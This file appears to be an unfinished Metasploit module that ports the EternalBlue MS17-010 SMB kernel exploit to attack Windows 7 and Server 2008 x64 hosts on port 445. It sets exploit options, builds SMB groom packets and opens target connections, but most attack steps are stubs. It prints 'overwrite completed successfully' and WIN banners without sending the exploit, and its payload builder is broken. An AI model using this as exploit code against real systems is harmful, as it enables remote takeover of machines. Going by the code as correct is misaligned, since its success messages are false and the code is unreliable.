# This module is a work in progress, do not use it yet.

##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::SMB::Client

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS17-010 EternalBlue SMBv1/SMBv2 Kernel Pool Corruption',
      'Description'    => %q{
        This module is a port of the Equation Group ETERNALBLUE exploit, part of
        the FuzzBunch toolkit released by Shadow Brokers.

        There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
        is calculated in Srv!SrvOs2FeaListSizeToNt, with logical error where a DWORD
        is subtracted into a WORD. The kernel pool is groomed so that overflow is
        well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
        completed in srvnet!SrvNetCommonReceiveHandler.

        This exploit, like the original may not trigger 100% of the time, and should be
        run continuously until triggered.
      },

      'Author'         => [
        'Sean Dillon <sean.dillon@risksense.com>',  # @zerosum0x0
        'Dylan Davis <dylan.davis@risksense.com>',  # @jennamagius
        'Equation Group',
        'Shadow Brokers'
       ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'MSB', 'MS17-010' ],
          [ 'CVE', '2017-0143' ],
          [ 'CVE', '2017-0144' ],
          [ 'CVE', '2017-0145' ],
          [ 'CVE', '2017-0146' ],
          [ 'CVE', '2017-0147' ],
          [ 'CVE', '2017-0148' ],
          [ 'URL', 'https://github.com/RiskSense-Ops/MS17-010' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Privileged'     => true,
      'Payload'        =>
        {
          'Space'           => 1024,
          'EncoderType'     => Msf::Encoder::Type::Raw,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows 7 and Server 2008 (x64) All Service Packs',
            {
              'Platform'       => 'win',
              'Arch'           => [ ARCH_X64 ],
              # todo: ring0 opaque offsets
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'March 14, 2017'
    ))

    register_options(
      [
        Opt::RPORT(445),
        OptInt.new( 'MaxExploitAttempts', [ true,  "The number of times to retry the exploit.", 3 ] ),
        OptInt.new( 'GroomAllocations', [ true,  "The number of times to groom the kernel pool.", 12 ] ),
        OptInt.new( 'GroomDelta', [ true,  "The amount to increase the groom count by per try.", 5 ] )
      ])
  end

  def check
    # todo: create MS17-010 mixin, and hook up auxiliary/scanner/smb/smb_ms17_010
  end

  def exploit
    begin
      for i in 1..datastore['MaxExploitAttempts']

        grooms = datastore['GroomAllocations'] + datastore['GroomDelta'] * (i - 1)

        smb_eternalblue(datastore['RHOST'], datastore['RPORT'], payload.encoded, grooms)

        handler
        #if handler == Msf::Handler::Claimed
        if self.session_count > 0 # || self.pending_connections > start_pending
          print_good("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          print_good("=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          print_good("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          break
        else
          print_bad("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          print_bad("=-=-=-=-=-=-=-=-=-=-=-=-=-FAIL=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          print_bad("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
        end
      end

    rescue => error
      puts error.message
      puts error.backtrace
    ensure
      #disconnect
    end
  end

  #
  # Increase the default delay by five seconds since some kernel-mode
  # payloads may not run immediately.
  #
  def wfs_delay
    super + 5
  end

  def build_payload_packet()
    kernel_shellcode = "\xc3"
    ring3 = payload.encoded           # Our ring3 shellcode
    shellcode = kernel_shellcode + ring3.len.to_s.pack("S<") + ring3
  end

  def groom_thread(groom_id, ip, port, payload)
    # send first part of groom
    vprint_status("Sending groom allocation in thread #{groom_id}.")

    # wait to keep going
    Thread.stop

    vprint_status("Closing groom thread. #{groom_id}")
  end

  def smb_eternalblue_start_grooms(ip, port, payload, grooms)
    @groom_packet = "\x00"            # NetBios Type = Session message
    @groom_packet << "\x00\xff\xf7"   # NetBios length
    @groom_packet << "\xfeSMB"        # SMB2
    @groom_packet << "\x00" * 128     # Null headers...

    grooms.times do |groom_id|
      @groom_threads << Thread.new do |thread_id|
        groom_thread(groom_id, ip, port, payload)
      end
    end
  end

  def smb_eternalblue_finish_grooms()
    # todo: experiment with reliability of these in 2 loops vs 1.
    # also, if main thread completes its actions before/after this method
    @groom_threads.each do |t|
      if t.stop?
        t.run
        t.join
      else
        t.terminate
      end
    end
  end

  def smb_eternalblue(ip, port, payload, grooms)
    begin
      # reset thread bucket
      @groom_threads = []

      print_status("Trying exploit with #{grooms} Groom Allocations.")
      print_status("Connecting to target for exploitation.")

      print_good("Connection established for exploitation.")

      #client1 = create_smb_connection(true, false)
      #client1.tree_connect("\\\\#{datastore['RHOST']}\\IPC$")

      # this is where we send all the Base64-looking gibberish
      print_status("Sending all but last fragment of exploit packet")


      print_status("Starting non-paged pool grooming")

      # print_status("Sending SMBv2 buffers")
      smb_eternalblue_start_grooms(ip, port, payload, grooms)

      # size = 1323 ?
      print_status("Sending last fragment of exploit packet!")


      print_status("Receiving response from exploit packet")

      # if smb.status == STATUS_INVALID_PARAMETER (0xC000000D)
      print_good("ETERNALBLUE overwrite completed successfully (0xC000000D)!")

      sleep 10

      smb_eternalblue_finish_grooms()

      # tree disconnect
      # logoff and x

    ensure
      @groom_threads.each do |t|
        t.terminate
      end
    end
  end

  def create_smb_connection(smb1_enabled, smb2_enabled)
    sock = TCPSocket.new datastore['RHOST'], datastore['RPORT']
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)
    client = RubySMB::Client.new(dispatcher, smb1: smb1_enabled, smb2: smb2_enabled, username: '', password: '', domain: '')
    client.negotiate

    client.authenticate

    return client
  end

end
